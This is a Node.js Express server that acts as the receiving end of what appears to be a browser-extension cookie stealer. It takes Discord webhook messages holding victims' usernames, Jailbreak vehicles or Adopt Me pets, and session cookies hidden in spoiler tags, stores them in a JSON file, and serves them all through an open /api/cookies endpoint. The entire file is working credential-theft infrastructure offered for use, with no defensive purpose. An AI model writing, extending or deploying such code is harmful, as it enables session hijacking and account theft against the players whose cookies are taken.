const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());

const DATA_FILE = path.join(__dirname, 'data.json');

// Load existing data or create empty file
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    }
  } catch (_) {}
  return { jailbreak: [], adoptme: [] };
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Endpoint for Discord webhook (you’ll set this as your webhook URL)
app.post('/webhook', (req, res) => {
  const { content } = req.body;
  if (!content) return res.status(400).send('Missing content');

  const data = loadData();
  // Parse the message – assumes the exact format we send from the extension
  const lines = content.split('\n');
  let entry = {};
  let type = 'jailbreak'; // default

  for (const line of lines) {
    const clean = line.replace(/\*\*/g, '').trim();
    if (clean.startsWith('Username:')) entry.username = clean.split('Username:')[1].trim();
    if (clean.startsWith('Vehicle:')) {
      entry.vehicle = clean.split('Vehicle:')[1].trim();
      type = 'jailbreak';
    }
    if (clean.startsWith('Pets:')) {
      entry.pet = clean.split('Pets:')[1].trim();
      type = 'adoptme';
    }
    if (clean.startsWith('Cookie:')) {
      // Extract cookie from spoiler: ||`...`||
      const match = clean.match(/\|\|`(.+?)`\|\|/);
      if (match) entry.cookie = match[1];
    }
  }

  if (entry.username && entry.cookie) {
    data[type].push(entry);
    saveData(data);
    console.log(`New ${type} entry from ${entry.username}`);
  }

  res.status(200).send('OK');
});

// API to get all entries
app.get('/api/cookies', (req, res) => {
  const data = loadData();
  res.json(data);
});

// Serve the frontend page (place index.html next to this file)
app.use(express.static(__dirname));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});